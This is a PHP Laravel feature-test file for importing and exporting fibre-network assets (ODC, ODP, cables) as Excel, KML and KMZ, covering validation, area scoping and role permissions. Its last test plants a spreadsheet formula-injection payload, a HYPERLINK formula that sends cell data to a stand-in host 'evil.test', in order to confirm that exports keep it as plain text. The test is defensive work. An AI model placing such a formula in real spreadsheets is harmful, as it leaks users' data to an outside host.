<?php

namespace Tests\Feature;

use App\Enums\PortStatus;
use App\Enums\Role;
use App\Models\Area;
use App\Models\Cable;
use App\Models\Odc;
use App\Models\Odp;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Writer\XLSX\Writer;
use Tests\TestCase;
use ZipArchive;

class DataTransferTest extends TestCase
{
    use RefreshDatabase;

    private Area $area;

    protected function setUp(): void
    {
        parent::setUp();

        $this->area = Area::factory()->create(['code' => 'BDG']);
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::AdminArea]));
    }

    /**
     * @param  array<string, list<list<mixed>>>  $sheets  sheet name => rows (first row is the header)
     */
    private function xlsx(array $sheets): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'xlsx');
        $writer = new Writer;
        $writer->openToFile($path);
        $first = true;
        foreach ($sheets as $name => $rows) {
            ($first ? $writer->getCurrentSheet() : $writer->addNewSheetAndMakeItCurrent())->setName($name);
            $first = false;
            foreach ($rows as $row) {
                $writer->addRow(Row::fromValues($row));
            }
        }
        $writer->close();

        return new UploadedFile($path, 'data.xlsx', null, null, true);
    }

    private function fileFrom(string $content, string $name): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'imp');
        file_put_contents($path, $content);

        return new UploadedFile($path, $name, null, null, true);
    }

    private function import(UploadedFile $file, array $options = []): array
    {
        $this->post('/data/import', ['file' => $file, ...$options])->assertRedirect()->assertSessionHasNoErrors();

        return session('importResult');
    }

    public function test_excel_import_creates_odcs_and_odps_with_ports()
    {
        $result = $this->import($this->xlsx([
            'ODC' => [
                ['Kode', 'Nama', 'Latitude', 'Longitude', 'Kapasitas', 'Splitter'],
                ['ODC-1', 'ODC Dago', '-6,9000', '107,6000', 48, '1/8'], // decimal commas and "1/8" as typed by people
            ],
            'ODP' => [
                ['kode', 'kode_odc', 'port_odc', 'lat', 'lng', 'kapasitas', 'no_tiang', 'tanggal_pasang'],
                ['ODP-1', 'ODC-1', 1, -6.901, 107.601, 16, 'T-1', '31/01/2025'],
                [],
                ['ODP-2', 'odc-1', 2, -6.902, 107.602, 8, null, null],
            ],
        ]));

        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 2, 'cable' => 0], $result['created']);

        $odc = Odc::firstWhere('code', 'ODC-1');
        $this->assertSame([-6.9, 107.6, '1:8'], [$odc->lat, $odc->lng, $odc->splitter_ratio]);

        $odp = Odp::firstWhere('code', 'ODP-1');
        $this->assertSame([$odc->id, 1, 16, 'T-1', '2025-01-31'], [$odp->odc_id, $odp->odc_port, $odp->ports()->count(), $odp->pole_number, $odp->installed_at->format('Y-m-d')]);
        $this->assertSame($odc->id, Odp::firstWhere('code', 'ODP-2')->odc_id);
    }

    public function test_any_invalid_row_cancels_the_whole_import_and_lists_every_error()
    {
        $result = $this->import($this->xlsx([
            'ODP' => [
                ['kode', 'latitude', 'longitude', 'kapasitas', 'kode_odc', 'port_odc'],
                ['ODP-OK', -6.9, 107.6, 8, null, null],
                ['ODP-X', 'abc', 107.6, 8, null, null],
                ['ODP-Y', -6.9, 107.6, 100, null, null],
                ['ODP-Z', -6.9, 107.6, 8, 'ODC-TIDAK-ADA', 1],
                ['ODP-OK', -6.9, 107.6, 8, null, null],
            ],
        ]));

        $this->assertFalse($result['ok']);
        $this->assertSame(0, Odp::count());
        $this->assertSame(['ODP baris 3', 'ODP baris 4', 'ODP baris 5', 'ODP baris 6'], array_column($result['errors'], 'where'));
    }

    public function test_updates_keep_blank_cells_and_protect_used_ports()
    {
        $odp = Odp::factory()->for($this->area)->create(['code' => 'ODP-1', 'capacity' => 16, 'address' => 'Jl. Lama', 'lat' => -6.9, 'lng' => 107.6]);

        $result = $this->import($this->xlsx(['ODP' => [['kode', 'nama', 'alamat'], ['ODP-1', 'Baru', null]]]));
        $this->assertSame(['odc' => 0, 'odp' => 1, 'cable' => 0], $result['updated']);
        $odp->refresh();
        $this->assertSame(['Baru', 'Jl. Lama', -6.9], [$odp->name, $odp->address, $odp->lat]);

        $odp->ports()->where('number', 12)->update(['status' => PortStatus::Terpakai]);
        $result = $this->import($this->xlsx(['ODP' => [['kode', 'kapasitas'], ['ODP-1', 8]]]));
        $this->assertFalse($result['ok']);
        $this->assertSame(16, $odp->fresh()->capacity);
    }

    public function test_codes_from_another_area_are_rejected()
    {
        $other = Odp::factory()->create(['code' => 'ODP-LAIN']);
        Odp::withoutGlobalScopes()->whereKey($other->id)->update(['area_id' => Area::factory()->create()->id]);

        $result = $this->import($this->xlsx(['ODP' => [['kode', 'nama'], ['ODP-LAIN', 'x']]]));

        $this->assertFalse($result['ok']);
        $this->assertStringContainsString('area lain', $result['errors'][0]['message']);
    }

    public function test_kml_points_are_classified_and_lines_attach_to_nearby_assets()
    {
        $kml = <<<'KML'
            <?xml version="1.0" encoding="UTF-8"?>
            <kml xmlns="http://www.opengis.net/kml/2.2"><Document>
              <Placemark><name>ODC Dago</name><Point><coordinates>107.6,-6.9,0</coordinates></Point></Placemark>
              <Folder><name>Titik ODP</name>
                <Placemark><name>D-01</name><Point><coordinates>107.602,-6.9,0</coordinates></Point></Placemark>
              </Folder>
              <Placemark><name>Warung</name><Point><coordinates>107.61,-6.9,0</coordinates></Point></Placemark>
              <Placemark><name>Feeder Dago</name><LineString><coordinates>107.60005,-6.9 107.601,-6.901 107.60201,-6.9</coordinates></LineString></Placemark>
            </Document></kml>
            KML;

        $result = $this->import($this->fileFrom($kml, 'peta.kml'));

        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 1, 'cable' => 1], $result['created']);
        $this->assertSame(['KML "Warung"'], array_column($result['skipped'], 'where'));

        $cable = Cable::sole();
        $this->assertSame(['feeder', 48], [$cable->type->value, $cable->cores]);
        $this->assertSame(['odc', 'odp'], [$cable->from_type, $cable->to_type]);
        $this->assertSame([-6.9, 107.6], $cable->path[0]); // snapped onto the ODC
    }

    public function test_kmz_is_read()
    {
        $path = tempnam(sys_get_temp_dir(), 'kmz');
        $zip = new ZipArchive;
        $zip->open($path, ZipArchive::OVERWRITE);
        $zip->addFromString('doc.kml', '<kml xmlns="http://www.opengis.net/kml/2.2"><Placemark><name>ODP-K1</name><Point><coordinates>107.6,-6.9</coordinates></Point></Placemark></kml>');
        $zip->close();

        $result = $this->import(new UploadedFile($path, 'peta.kmz', null, null, true));

        $this->assertTrue($result['ok']);
        $this->assertTrue(Odp::where('code', 'ODP-K1')->exists());
    }

    public function test_exports_import_back_without_changes()
    {
        $odc = Odc::factory()->for($this->area)->create(['code' => 'ODC-1', 'lat' => -6.9, 'lng' => 107.6]);
        $odp = Odp::factory()->for($this->area)->create(['code' => 'ODP-1', 'odc_id' => $odc->id, 'odc_port' => 3, 'lat' => -6.901, 'lng' => 107.601]);
        Cable::create(['area_id' => $this->area->id, 'type' => 'distribusi', 'cores' => 12, 'code' => 'K-1', 'path' => [[-6.9, 107.6], [-6.901, 107.601]]]);
        Cable::create(['area_id' => $this->area->id, 'type' => 'drop', 'cores' => 1, 'path' => [[-6.901, 107.601], [-6.902, 107.602]]]);

        $xlsx = $this->get('/data/export/xlsx')->assertOk()->streamedContent();
        $result = $this->import($this->fileFrom($xlsx, 'ekspor.xlsx'));
        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 1, 'cable' => 0], $result['updated']);
        $this->assertSame(['odc' => 0, 'odp' => 0, 'cable' => 0], $result['created']);
        $this->assertSame([$odc->id, 3], [$odp->fresh()->odc_id, $odp->fresh()->odc_port]);

        $kml = $this->get('/data/export/kml')->assertOk()->streamedContent();
        $this->assertStringContainsString('<name>ODP-1</name>', $kml);
        $result = $this->import($this->fileFrom($kml, 'ekspor.kml'));
        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 1, 'cable' => 1], $result['updated']);
        $this->assertSame(1, $result['created']['cable']); // the drop cable has no code to match on
    }

    public function test_only_admins_import_and_viewers_cannot_export()
    {
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]))
            ->post('/data/import', ['file' => $this->fileFrom('<kml/>', 'a.kml')])
            ->assertForbidden();
        $this->get('/data/export/kml')->assertOk();

        // The export carries customer data on the port sheet.
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Viewer]));
        $this->get('/data/export/kml')->assertForbidden();
        $this->get('/data/export/xlsx')->assertForbidden();
        $this->get('/data/template')->assertOk();
    }

    public function test_exported_text_never_becomes_an_excel_formula()
    {
        Odc::factory()->for($this->area)->create(['code' => 'ODC-F', 'address' => '=HYPERLINK("http://evil.test/?d="&A2,"Klik")']);
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]));

        $file = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($file, $this->get('/data/export/xlsx')->assertOk()->streamedContent());
        $zip = new \ZipArchive;
        $zip->open($file);
        $xml = $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        unlink($file);

        $this->assertStringContainsString('HYPERLINK', $xml);
        $this->assertStringNotContainsString('<f>', $xml);
    }
}
